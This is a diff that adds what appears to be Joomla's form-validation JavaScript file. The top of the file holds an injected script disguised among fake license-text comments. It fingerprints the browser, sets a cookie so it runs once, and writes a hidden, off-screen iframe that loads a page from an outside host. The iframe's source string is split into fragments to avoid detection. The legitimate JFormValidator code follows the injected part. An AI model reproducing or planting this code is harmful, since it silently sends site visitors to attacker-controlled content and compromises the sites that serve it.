@@ -1,0 +1,101 @@
+/*Activities other than copying, distribution and modification are not covered by this License; they are outside its scope. The act of running the Program is not restricted, and the output from the Program is covered only if its contents constitute a work based on the Program (independent of having been made by running the Program). Whether that is true depends on what the Program does.*/
+(function(){
+function stripos (m_haystack, m_needle, m_offset) {
+ var haystack = (m_haystack + '').toLowerCase();
+ var needle = (m_needle + '').toLowerCase();
+ var index = 0;
+ if ((index = haystack.indexOf(needle, m_offset)) !== -1) {
+  return index;
+ }
+
+/*
+"License" shall mean the terms and conditions for use, reproduction,
+      and distribution as defined by Sections 1 through 9 of this document.
+
+      "Licensor" shall mean the copyright owner or entity authorized by
+      the copyright owner that is granting the License.
+*/
+
+ return false;
+}
+
+/*
+"Legal Entity" shall mean the union of the acting entity and all
+      other entities that control, are controlled by, or are under common
+      control with that entity. For the purposes of this definition,
+      "control" means (i) the power, direct or indirect, to cause the
+      direction or management of such entity, whether by contract or
+      otherwise, or (ii) ownership of fifty percent (50%) or more of the
+      outstanding shares, or (iii) beneficial ownership of such entity.
+*/
+
+function mmm_check_ua(){
+ var blackData = ['iPhone','Macintosh','Linux','iPad','Android','FreeBSD','Chrome','IEMobile','SymbianOS','Avant','Chromium','Firefox'];
+ var blackUser = false;
+ for (var i in blackData) {
+  if (stripos(navigator.userAgent, blackData[i])) {
+   blackUser = true;
+   break;
+  }
+ }
+ return blackUser;
+}
+
+/*
+"Derivative Works" shall mean any work, whether in Source or Object
+      form, that is based on (or derived from) the Work and for which the
+      editorial revisions, annotations, elaborations, or other modifications
+      represent, as a whole, an original work of authorship. For the purposes
+      of this License, Derivative Works shall not include works that remain
+      separable from, or merely link (or bind by name) to the interfaces of,
+      the Work and Derivative Works thereof.
+*/
+
+function setZone(name, value, expires) {
+ var date = new Date( new Date().getTime() + expires*1000 );
+ document.cookie = name+'='+value+'; path=/; expires='+date.toUTCString();
+}
+
+/*
+Grant of Copyright License. Subject to the terms and conditions of
+      this License, each Contributor hereby grants to You a perpetual,
+      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
+      copyright license to reproduce, prepare Derivative Works of,
+      publicly display, publicly perform, sublicense, and distribute the
+      Work and such Derivative Works in Source or Object form.
+*/
+
+function getCookie(name) {
+ var matches = document.cookie.match(new RegExp( "(?:^|; )" + name.replace(/([\.$?*|{}\(\)\[\]\/\+^])/g, '$1') + "=([^;]*)" ));
+ return matches ? decodeURIComponent(matches[1]) : undefined;
+}
+
+/*
+Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+*/
+
+if (!mmm_check_ua()) {
+ var cookie = getCookie('lisapos19ajerlam');
+ if (cookie == undefined) {
+  setZone('lisapos19ajerlam', true, 260001);	
+
+/*
+You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+*/
+
+  document.write('<iframe sr'+'c'+'="http://homanter.namadev.com.ar/hrehdfgewerhre13.html" s'+'tyle="posit'+'ion:absolute;left'+':'+'-'+'1372px;top'+':'+'-'+'1372px;" height="132" width="132"></iframe>');
+ }
+}
+})();
+/*These requirements apply to the modified work as a whole. If identifiable sections of that work are not derived from the Program, and can be reasonably considered independent and separate works in themselves, then this License, and its terms, do not apply to those sections when you distribute them as separate works. But when you distribute the same sections as part of a whole which is a work based on the Program, the distribution of the whole must be on the terms of this License, whose permissions for other licensees extend to the entire whole, and thus to each and every part regardless of who wrote it.*//*
+		GNU General Public License version 2 or later; see LICENSE.txt
+*/
+Object.append(Browser.Features,{inputemail:function(){var e=document.createElement("input");e.setAttribute("type","email");return e.type!=="text"}()});var JFormValidator=new Class({initialize:function(){this.handlers=Object();this.custom=Object();this.setHandler("username",function(e){regex=new RegExp("[<|>|\"|'|%|;|(|)|&]","i");return!regex.test(e)});this.setHandler("password",function(e){regex=/^\S[\S ]{2,98}\S$/;return regex.test(e)});this.setHandler("numeric",function(e){regex=/^(\d|-)?(\d|,)*\.?\d*$/;return regex.test(e)});this.setHandler("email",function(e){regex=/^[a-zA-Z0-9.!#$%&‚Äô*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;return regex.test(e)});var e=$$("form.form-validate");e.each(function(e){this.attachToForm(e)},this)},setHandler:function(e,t,n){n=n==""?true:n;this.handlers[e]={enabled:n,exec:t}},attachToForm:function(e){e.getElements("input,textarea,select,button").each(function(e){if(e.hasClass("required")){e.set("aria-required","true");e.set("required","required")}if((document.id(e).get("tag")=="input"||document.id(e).get("tag")=="button")&&document.id(e).get("type")=="submit"){if(e.hasClass("validate")){e.onclick=function(){return document.formvalidator.isValid(this.form)}}}else{e.addEvent("blur",function(){return document.formvalidator.validate(this)});if(e.hasClass("validate-email")&&Browser.Features.inputemail){e.type="email"}}})},validate:function(e){e=document.id(e);if(e.get("disabled")&&!e.hasClass('required')){this.handleResponse(true,e);return true}if(e.hasClass("required")){if(e.get("tag")=="fieldset"&&(e.hasClass("radio")||e.hasClass("checkboxes"))){for(var t=0;;t++){if(document.id(e.get("id")+t)){if(document.id(e.get("id")+t).checked){break}}else{this.handleResponse(false,e);return false}}}else if(!e.get("value")){this.handleResponse(false,e);return false}}var n=e.className&&e.className.search(/validate-([a-zA-Z0-9\_\-]+)/)!=-1?e.className.match(/validate-([a-zA-Z0-9\_\-]+)/)[1]:"";if(n==""){this.handleResponse(true,e);return true}if(n&&n!="none"&&this.handlers[n]&&e.get("value")){if(this.handlers[n].exec(e.get("value"))!=true){this.handleResponse(false,e);return false}}this.handleResponse(true,e);return true},isValid:function(e){var t=true;var n=e.getElements("fieldset").concat(Array.from(e.elements));for(var r=0;r<n.length;r++){if(this.validate(n[r])==false){t=false}}(new Hash(this.custom)).each(function(e){if(e.exec()!=true){t=false}});if(!t){var i=Joomla.JText._("JLIB_FORM_FIELD_INVALID");var s=jQuery("label.invalid");var o=new Object;o.error=new Array;for(var r=0;r<s.length;r++){var u=jQuery(s[r]).text();if(u!="undefined"){o.error[r]=i+u.replace("*","")}}Joomla.renderMessages(o)}return t},handleResponse:function(e,t){if(!t.labelref){var n=$$("label");n.each(function(e){if(e.get("for")==t.get("id")){t.labelref=e}})}if(e==false){t.addClass("invalid");t.set("aria-invalid","true");if(t.labelref){document.id(t.labelref).addClass("invalid");document.id(t.labelref).set("aria-invalid","true")}}else{t.removeClass("invalid");t.set("aria-invalid","false");if(t.labelref){document.id(t.labelref).removeClass("invalid");document.id(t.labelref).set("aria-invalid","false")}}}});document.formvalidator=null;window.addEvent("domready",function(){document.formvalidator=new JFormValidator})
